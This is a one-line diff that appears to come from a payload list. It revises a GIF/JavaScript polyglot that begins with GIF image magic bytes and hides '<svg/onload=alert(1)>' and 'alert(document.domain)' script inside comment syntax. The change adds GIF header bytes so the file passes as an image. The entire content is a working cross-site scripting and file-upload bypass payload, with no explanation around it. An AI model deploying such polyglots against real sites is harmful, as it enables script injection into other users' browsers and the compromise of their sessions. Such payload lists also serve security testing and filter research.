@@ -1,1 +1,1 @@
-GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+GIF89a\x10\x00\x10\x00/*<svg/onload=alert(1)>*/=alert(document.domain)//;
